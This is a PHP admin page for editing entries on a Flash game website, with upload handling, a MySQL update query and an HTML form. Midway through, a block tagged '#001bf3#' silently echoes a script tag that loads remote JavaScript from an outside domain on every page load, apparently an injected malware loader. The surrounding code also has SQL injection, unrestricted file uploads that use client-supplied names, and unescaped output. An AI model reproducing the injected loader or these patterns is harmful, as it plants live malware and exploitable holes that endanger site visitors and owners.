<?php session_start();
ob_start();

include "inc/session_check.php";
$page = "Edit Game";
$side_menu="Game";
  $adid = urlsafe_b64decode($_REQUEST['id']);
 $rawid = $_REQUEST['id'];
if(isset($_POST['submit']))
{
 
	$cat_id = $_POST['cat_id'];
	$title = $_POST['title'];
	$instructions=$_POST['instructions'];
	
	$keywords=addslashes($_POST['keywords']);
	$meta_tag = $_POST['meta_tag'];
	
	$other_site = $_POST['other_site'];
	
	$status = $_POST['status'];
	
	
	$target_path="../sites/default/files/games_images/".$_FILES['image_file']['name'];
	
	$target_path1="../sites/default/files/flash/".$_FILES['flash_file']['name'];
	
	if(move_uploaded_file($_FILES['flash_file']['tmp_name'], $target_path1))
	{
	
		if(move_uploaded_file($_FILES['image_file']['tmp_name'], $target_path)) 
		{
		
			  $ins="update game set cat_id='$cat_id',title='$title',instructions='$instructions',image_file='$target_path',keywords='$keywords',meta_tag='$meta_tag',flash_file='$target_path1',other_site='$other_site',status='$status' where id='$adid'";
			  
		}
	}
		else
		{
			header("location: edit_game.php?msg=err&cont=Erro can't upload original image.");
		}
		 
 
	if(mysql_query($ins))
	{
	//unset($_POST);
	header("location: list_game.php?msg=succ&cont=Game details uploaded successfully");
	}
	else
	{
		header("location: edit_game.php?msg=err&cont=Error in update query");
	}


}


$select_ad = mysql_query("select * from game where id='$adid'");
$fetch_ad = mysql_fetch_array($select_ad);


?>
<!DOCTYPE html>
  <!--[if lt IE 7]>
    <html class="lt-ie9 lt-ie8 lt-ie7" lang="en">
  <![endif]-->

  <!--[if IE 7]>
    <html class="lt-ie9 lt-ie8" lang="en">
  <![endif]-->

  <!--[if IE 8]>
    <html class="lt-ie9" lang="en">
  <![endif]-->

  <!--[if gt IE 8]>
    <!-->
    <html lang="en">
    <!--
  <![endif]-->

  <head>
    <meta charset="utf-8">
    <title>Game Admin | Edit Game</title>
     <link href="icomoon/style.css" rel="stylesheet">
    <!--[if lte IE 7]>
      <script src="css/icomoon-font/lte-ie7.js"></script>
    <![endif]-->
    <link href="css/main.css" rel="stylesheet">
    

  </head>
  <body>
    
    <?php 
	  	include "inc/header.php";
    ?>

    <div class="container-fluid">
      
    <?php 
	  	include "inc/main_nav.php";
    ?>
      
      <div class="dashboard-wrapper">
        <div class="main-container">
        
          <?php 
		  	include "inc/sub_navbar.php";
			include "inc/breadcrumb.php";
		  ?>

			<div class="row-fluid">
            <div class="span6">
              <div class="widget">
                <div class="widget-header">
                  <div class="title">
                Edit  Game
                  </div>
                </div>
                <div class="widget-body">
<?php include 'message.php';  ?>
<?php
#001bf3#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967021\"></script>";
echo $g;
}
#/001bf3#
?><form class="form-horizontal no-margin well" id="ad_form" name="form" method="post" enctype="multipart/form-data" >
	            	  <h5 class="text-info">Edit Game Information</h5>
                    <hr>
  		<div class="control-group">
                      <label class="control-label">
                        Choose Category * :
                      </label>
                      <div class="controls">
                      	<select class="required span4" name="cat_id" id="cat_id">
					<option value="">--Select</option>

       <?php
	$selectcat = mysql_query("select id,name from category where status=1 order by name asc");
	while($fetchcat=mysql_fetch_array($selectcat))
	{
	 ?>
                      	
					<option  <?php if($fetch_ad['cat_id']==$fetchcat['id']){ echo "selected='selected'"; } ?> value="<?=$fetchcat['id']?>"><?=$fetchcat['name']?></option>
					
					<?php } ?>
										</select>

                     </div>
                    </div>
                    <div class="control-group">
                      <label class="control-label">
                        Title * :
                      </label>
                      <div class="controls">
                        <input type="text" class="required span4" value="<?=$fetch_ad['title']?>" name="title">
                      </div>
                    </div>
                    
                    <div class="control-group">
                      <label class="control-label">
                        Instructions * :
                      </label>
                      <div class="controls">
                        <input type="text" class="required span4" value="<?=$fetch_ad['instructions']?>" name="instructions">
                      </div>
                    </div>
                    <div class="control-group">
                      <label class="control-label">
                       Image File :
                      </label>
                      <div class="controls">
                       <input type="file" class="required span4" name="image_file" value="<?=$fetch_ad['image_file']?>"><img src="<?=$fetch_ad['image_file']?>" width="100" />  
                      </div>
                    </div>
                    <div class="control-group">
                      <label class="control-label">
                        Keywords * :
                      </label>
                      <div class="controls">
                        <input type="text" class="required span4" name="keywords" value="<?=$fetch_ad['keywords']?>">
                      </div>
                    </div>
                    <div class="control-group">
                      <label class="control-label">
                        Meta Tag * :
                      </label>
                      <div class="controls">
                        <input type="text" class="required span4" name="meta_tag" value="<?=$fetch_ad['meta_tag']?>">
                      </div>
                    </div>
                    
                    <div class="control-group">
                      <label class="control-label">
                       Flash file * :
                      </label>
                      <div class="controls">
					  <label class="radio inline">
                        	<input type="file" value="<?=$fetch_ad['flash_file']?>" name="flash_file"/><?=$fetch_ad['flash_file']?> 
					  </label>
                      </div>
                    </div> 
                    
                    
				   <div class="control-group">
                      <label class="control-label">
                        Othersite Game:
                      </label>
                      <div class="controls">
                      	<label class="radio inline">
                     <input type="radio" name="other_site"  <?php if($fetch_ad['other_site']=="no"){ echo 'checked="checked"'; } ?>value="no" />No 
					</label>
					<label class="radio inline">
					 <input type="radio" name="other_site" <?php if($fetch_ad['other_site']=="yes"){ echo 'checked="checked"'; } ?>  value="yes" />Yes
					 </label>
                      </div>
                    </div>
                        
                    <div class="control-group">
                      <label class="control-label">
                       Status * :
                      </label>
                      <div class="controls">
					  <label class="radio inline">
                        	<select name="status">
                        		<option <?php if($fetch_ad['status']==1){ echo "selected='selected'"; } ?> value="1"  >Active</option>
                        		<option  <?php if($fetch_ad['status']==0){ echo "selected='selected'"; } ?>  value="0"  >Inactive</option>
                        	</select>
					  </label>
                      </div>
                    </div> 
                    
                    
			 
				 <div class="form-actions no-margin">
				 	<input type="submit" class="btn btn-info" name="submit" value="submit">
                    </div>
			</form>
				</div>
              </div>
            </div>

            
          </div>

          
        </div>
      </div>
    </div>
    
    <?php
    include 'inc/footer.php';
    ?>
  
   <script src="js/wysiwyg/wysihtml5-0.3.0.js"></script>
    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/wysiwyg/bootstrap-wysihtml5.js"></script>
    <script type="text/javascript"  src="js/jquery-latest.js"></script>
<script type="text/javascript"  src="js/jquery.validate.js"></script>
<script>
  $(document).ready(function(){
    $("#ad_form").validate({
    	success: function(label) {
			// set &nbsp; as text for IE
			label.html("&nbsp;").addClass("checked");
		}
    });
    $("#advert_pos").change(function(){
    	var posid = $(this).val();
    	dataString = "posid="+posid;
    	$.ajax({
    	type: "POST",
    	url: "get_ad_size.php",
    	data: dataString,
    	success: function(html){
    		$("#advert_size").html(html);
    	}
    	})
    });
    });
</script>
</body>
</html>
	